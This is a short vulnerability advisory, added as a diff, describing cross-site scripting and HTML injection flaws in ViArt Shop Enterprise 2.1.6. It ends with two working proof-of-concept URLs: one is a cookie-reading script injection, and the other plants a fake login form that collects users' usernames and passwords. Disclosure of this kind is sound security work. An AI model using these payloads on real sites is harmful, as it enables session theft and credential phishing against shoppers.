@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/13462/info
+ 
+ViArt Shop is affected by multiple cross-site scripting and HTML injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in dynamically generated content.
+ 
+Attacker-supplied HTML and script code would be able to access properties of the site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.
+ 
+These issues are reported to affect ViArt Shop Enterprise version 2.1.6; other versions may also be vulnerable. 
+
+http://www.example.com/page.php?page=about%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/page.php?page=%3Cp%3Ean%20eror%20was%20send%20to%20webmaster,%20please%20insert%20your%20username%20and%20password%20,%20and%20continue%20shopping%20%3Cform%20action=%22http://www.example.com/save.php%22%20method=%22post%22%3EUsername:%3Cinput%20aame=%22username%22%20type=%22text%22%20maxlength=%2230%22%3E%3Cbr%3EPassword:%3Cinput%20name=%22password%22%20type=%22text%22%20maxlength=%2230%22%3E%3Cbr%3E%3Cinput%20name=%22login%22%20type=%22submit%22%20value=%22Login%22%3E%3C/form%3E
